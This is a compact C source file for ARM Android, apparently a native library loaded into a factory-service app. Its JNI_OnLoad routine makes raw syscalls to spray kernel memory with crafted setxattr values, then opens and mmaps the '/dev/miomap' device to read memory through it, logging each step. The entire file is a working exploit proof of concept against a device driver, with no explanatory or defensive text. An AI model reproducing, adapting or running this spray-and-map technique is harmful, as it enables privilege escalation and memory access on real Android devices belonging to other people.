#define SYS_open 5
#define SYS_close 6
#define SYS_mmap2 192
#define SYS_setxattr 226
#define SYS_write 4
static long sc(long n,long a,long b,long c,long d,long e,long f){register long r7 __asm__("r7")=n;register long r0 __asm__("r0")=a;register long r1 __asm__("r1")=b;register long r2 __asm__("r2")=c;register long r3 __asm__("r3")=d;register long r4 __asm__("r4")=e;register long r5 __asm__("r5")=f;__asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");return r0;}
static long lg;static void put(const char*s){int n=0;while(s[n])n++;if(lg>=0)sc(SYS_write,lg,(long)s,n,0,0,0);}static void hx(unsigned long v){char b[20];int i;for(i=0;i<16;i++){int d=(v>>((15-i)*4))&15;b[i]=d<10?48+d:87+d;}b[16]=10;b[17]=0;put(b);}
int JNI_OnLoad(void*a,void*b){char val[16];int i,r;unsigned long long *q=(unsigned long long*)val;q[0]=0x20280000ULL;q[1]=0x1000ULL;lg=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/miospray.log",0x241,0644,0,0,0);put("start\n");long f=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/sprayfile",0x42,0600,0,0,0);put("file=");hx(f);if(f>=0)sc(SYS_close,f,0,0,0,0,0);
 int ok=0;for(i=0;i<2000;i++){r=sc(SYS_setxattr,(long)"/data/data/com.cvte.factory.service/files/sprayfile",(long)"user.x",(long)val,16,0,0);if(r==0)ok++;else if(i==0){put("setxattr err=");hx(-r);}}
 put("ok=");hx(ok);if(!ok){put("skip\n");return 0x10006;}
 long m=sc(SYS_open,(long)"/dev/miomap",2,0,0,0,0);put("miomap=");hx(m);if(m>=0){long p=sc(SYS_mmap2,0,0x1000,3,1,m,0);put("mmap=");hx(p);if((long)p>=0 && p!=(long)-1){unsigned int w=*(volatile unsigned int*)(long)p;put("word=");hx(w);}}
 put("end\n");return 0x10006;}
